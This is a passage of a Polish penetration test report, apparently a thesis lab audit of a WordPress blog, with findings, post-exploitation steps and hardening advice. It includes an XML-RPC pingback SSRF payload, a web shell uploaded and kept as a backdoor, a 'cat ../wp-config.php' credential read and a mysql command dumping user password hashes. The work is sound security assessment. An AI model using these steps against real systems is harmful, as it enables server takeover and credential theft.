    <methodCall>
      <methodName>pingback.ping</methodName>
      <params>
        <param><value><string>http://127.0.0.1:55555/test</string></value></param>
        <param><value><string>http://192.168.56.1:31337/?p=1</string></value></param>
      </params>
    </methodCall>
    ```
    
    _Rezultat:_ Serwer zwrócił odpowiedź `faultCode 0` (sukces), co potwierdza brak mechanizmów blokujących ruch do sieci wewnętrznej (brak whitelisty/blacklisty adresów). W prawidłowo zabezpieczonej aplikacji próba użycia adresu pętli zwrotnej powinna zostać odrzucona na etapie walidacji.
    
- **Dowód wizualny:**
  ![Błąd wyświetlania](/screenshots/PoC-SSRF.png)
    
- **Ryzyko:** Średnie. Możliwość interakcji z usługami wewnętrznymi, które nie wymagają uwierzytelniania, lub wykorzystanie serwera do ataków typu DoS na inne elementy infrastruktury.

### V-08: Unauthenticated Arbitrary File Upload (RCE) - A04:2025 – Insecure Design

- **ID:** V-08

- **CWE:** CWE-434: Unrestricted Upload of File with Dangerous Type

- **Podatność:** Remote Code Execution (RCE) via Insufficient File Validation

- **CVSS v4.0 Score:** 9.3 (Critical)

- **Wektor CVSS:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`

- **Lokalizacja:** Podstrona `/rekrutacja` (Wtyczka `wp-file-upload` v4.12.2)

- **Opis:** W trakcie mapowania aplikacji zidentyfikowano podstronę `/rekrutacja`, zawierającą formularz przesyłania plików oparty na wtyczce `WordPress File Upload` w wersji 4.12.2. Testy bezpieczeństwa wykazały, że zaimplementowany mechanizm walidacji plików jest nieskuteczny lub błędnie skonfigurowany. Aplikacja akceptuje pliki o rozszerzeniach wykonywalnych (np. `.php`), nie weryfikując poprawnie ich typu MIME ani zawartości po stronie serwera. Ponadto, formularz jest dostępny dla użytkowników nieuwierzytelnionych (Gości), co pozwala na anonimowe umieszczenie złośliwego oprogramowania w katalogu `/wp-content/uploads/`.

- **Dowód Koncepcji (PoC):**
	1. **Rekonesans:** Zidentyfikowano publicznie dostępny formularz pod adresem `http://192.168.56.1:31337/rekrutacja/`.
	2. **Przygotowanie Payloadu:** Przygotowano plik `terminal.php` – skrypt PHP emulujący interfejs terminala (GUI Web Shell), pozwalający na wykonywanie komend systemowych.
	3. **Eksploatacja:** Przesłano plik `terminal.php` za pomocą formularza, omijając zabezpieczenia (lub wykorzystując ich brak). Serwer zwrócił status powodzenia operacji.
	4. **Weryfikacja:** Wywołano wgrany skrypt bezpośrednio z przeglądarki i wykonano testową komendę systemową `ls -la`.

	*Shell URL:*
	`http://192.168.56.1:31337/wp-content/uploads/rekrutacja/terminal.php`

	*Rezultat (Wykonanie komendy `ls -la`):*
	```text
	drwxrwxrwx 1 www-data www-data   4096 Dec 10 01:30 .
	drwxrwxrwx 1 www-data www-data   4096 Dec 10 01:25 ..
	-rw-r--r-- 1 www-data www-data    845 Dec 10 01:30 terminal.php
	```

- **Dowód wizualny:**
	![Błąd wyświetlania](/screenshots/PoC-WebShell.png)

- **Ryzyko:** Krytyczne. Luka umożliwia anonimowemu atakującemu zdalne wykonanie dowolnego kodu (RCE), co prowadzi do całkowitego przejęcia kontroli nad serwerem, kradzieży danych z bazy oraz możliwości ataku na inne zasoby w sieci wewnętrznej.

## FAZA 6: Faza Post-Eksploatacyjna (Post Exploitation)
_Działania podjęte po pomyślnej eksploatacji podatności w celu oceny realnego wpływu ataku na organizację (Business Impact Analysis)._

### 6.1. Eksfiltracja Danych Krytycznych (Data Exfiltration)
- **Cel:** Pozyskanie poświadczeń dostępowych do bazy danych.
- **Wektor:** Wykorzystanie podatności V-01 (RCE w Social Warfare).
- **Działanie:** Odczyt pliku konfiguracyjnego WordPress znajdującego się poza katalogiem publicznym (`../`).
- **Komenda:** `cat ../wp-config.php`
- **Rezultat:** Sukces. Pozyskano login i hasło do głównej bazy danych.

**Zidentyfikowane Poświadczenia:**
- **Baza Danych:** `wordpress`
- **Użytkownik:** `root` (Naruszenie zasady Least Privilege - aplikacja WWW nie powinna łączyć się jako root)
- **Hasło:** `password`
- **Host:** `mysql` (Wewnętrzny kontener Docker)

### 6.2. Utrzymanie Dostępu (Persistence)
- **Cel:** Zapewnienie trwałego dostępu do serwera w przypadku załatania pierwotnych podatności (np. aktualizacji wtyczki Social Warfare).
- **Wektor:** Wykorzystanie podatności V-08 (File Upload).
- **Działanie:** Pozostawienie na serwerze pliku `terminal.php` (GUI Web Shell), który pełni rolę "Tylnej Furtki" (Backdoor).
- **Weryfikacja:** Nawet po wylogowaniu się i zmianie adresu IP, atakujący zachowuje możliwość wykonywania komend systemowych poprzez bezpośrednie odwołanie do pliku:
  `http://192.168.56.1:31337/wp-content/uploads/rekrutacja/terminal.php`

### 6.3. Weryfikacja Dostępu do Bazy Danych
- **Cel:** Potwierdzenie, czy wykradzione poświadczenia pozwalają na modyfikację danych.
- **Działanie:** Wykorzystanie Web Shella (`terminal.php`) do nawiązania połączenia z bazą.
- **Komenda (przykład):**
  `mysql -u root -ppassword -h mysql -D wordpress -e "SELECT user_login, user_pass FROM wp_users;"`
- **Wnioski:** Użytkownik `root` posiada pełne uprawnienia (GRANT ALL). Atakujący jest w stanie wykraść hashe wszystkich użytkowników, zmodyfikować treści na stronie lub całkowicie usunąć bazę danych.

### 6.4. Czyszczenie Śladów (Clean Up)
1. Usunięcie pliku `terminal.php` z katalogu `/wp-content/uploads/rekrutacja/`.
2. Przywrócenie oryginalnej konfiguracji pliku `wfu_security.php` (włączenie filtrów rozszerzeń).
3. Usunięcie strony "Rekrutacja".
4. Przywrócenie hasła administratora (jeśli było zmieniane).

## FAZA 7: Raportowanie Wyników (Reporting)

### 7.1. Podsumowanie Zarządcze (Executive Summary)
Przeprowadzony audyt bezpieczeństwa aplikacji "PracaInzynierskaBlog" wykazał **krytyczny** poziom ryzyka dla bezpieczeństwa przetwarzanych danych oraz ciągłości działania serwisu.

W toku prac zidentyfikowano 8 podatności, z których 3 posiadają status **krytyczny**. Najpoważniejsze luki (RCE - Zdalne Wykonanie Kodu) pozwalają nieautoryzowanemu atakującemu na całkowite przejęcie kontroli nad serwerem, modyfikację zawartości strony oraz kradzież pełnej bazy danych użytkowników i klientów.

**Kluczowe ryzyka biznesowe:**
1.  **Całkowita utrata poufności:** Atakujący ma swobodny dostęp do danych osobowych i haseł.
2.  **Utrata wizerunku:** Możliwość podmienienia treści strony (Defacement) lub wykorzystania serwera do atakowania innych podmiotów.
3.  **Trwałość ataku:** Zidentyfikowano błędy konfiguracyjne pozwalające atakującemu na instalację tzw. tylnych furtek (backdoors), zapewniających dostęp nawet po zmianie haseł.
4.  **Ryzyko prawne i regulacyjne (RODO/GDPR):** Przejęcie bazy danych zawierającej dane osobowe użytkowników stanowi naruszenie poufności, które zgodnie z art. 33 RODO może wymagać zgłoszenia do UODO oraz wiązać się z wysokimi karami administracyjnymi.

**Rekomendacja:** Zaleca się natychmiastowe wyłączenie serwisu z sieci publicznej do czasu wdrożenia poprawek krytycznych (aktualizacja wtyczek, usunięcie złośliwego oprogramowania).

### 7.2. Podsumowanie Techniczne
Testy przeprowadzono zgodnie z metodyką PTES (Penetration Testing Execution Standard) w modelu grey-box (częściowa wiedza o systemie). Analizę podatności oparto o klasyfikację OWASP Top 10 (2025).

**Statystyki Podatności:**
- **Krytyczne:** 3 (RCE, SQL Injection, Arbitrary File Upload)
- **Wysokie:** 0
- **Średnie:** 5 (Stored XSS, Brute Force, CSRF, SSRF, Sensitive Data Exposure)

Główną przyczyną tak złego stanu bezpieczeństwa jest tzw. dług technologiczny – wykorzystanie niewspieranej wersji systemu CMS WordPress (5.3) oraz wtyczek nieaktualizowanych od kilku lat (`social-warfare`, `wp-file-upload`). Dodatkowo, serwer (kontener Docker) łamie zasadę najmniejszych uprawnień, łącząc się z bazą danych jako użytkownik `root`.

### 7.3. Rekomendacje Ogólne (Hardening)
Oprócz naprawy konkretnych podatności opisanych w Fazie 5, należy wdrożyć systemowe zmiany podnoszące poziom bezpieczeństwa:

1.  **Zarządzanie Aktualizacjami (Patch Management):**
    - Bezwzględna aktualizacja WordPress Core do najnowszej wersji stabilnej.
    - Usunięcie nieużywanych wtyczek (`wp-advanced-search`, `social-warfare`) lub ich aktualizacja.
    - Wdrożenie procedury automatycznych aktualizacji bezpieczeństwa.
    - Wdrożenie nagłówka Content Security Policy (CSP), który zablokuje wykonywanie skryptów inline (`unsafe-inline`) oraz ograniczy źródła, z których mogą być ładowane zasoby, co stanowi skuteczną mitygację skutków ataków XSS.

2.  **Konfiguracja Serwera i PHP:**
    - Zmiana uprawnień użytkownika bazy danych w `wp-config.php` (odebranie praw `root`, stworzenie dedykowanego użytkownika z uprawnieniami tylko do bazy `wordpress`).
    - Wyłączenie edycji plików z poziomu kokpitu: `define('DISALLOW_FILE_EDIT', true);`.
    - Zablokowanie listowania katalogów (Directory Listing) w konfiguracji Apache/Nginx.

3.  **Ochrona Aplikacji Webowej (WAF):**
    - Wdrożenie Web Application Firewall (np. ModSecurity lub wtyczka typu Wordfence) w celu blokowania prób SQL Injection i XSS.
    - Ograniczenie dostępu do `/wp-admin` tylko dla zaufanych adresów IP (jeśli możliwe) lub wdrożenie 2FA.

4.  **Zabezpieczenie API:**
    - Całkowite wyłączenie `xmlrpc.php`, jeśli nie jest wymagany przez zewnętrzne integracje (mitygacja Brute Force i SSRF).
    - Ograniczenie widoczności REST API `/wp/v2/users` tylko dla zalogowanych użytkowników.
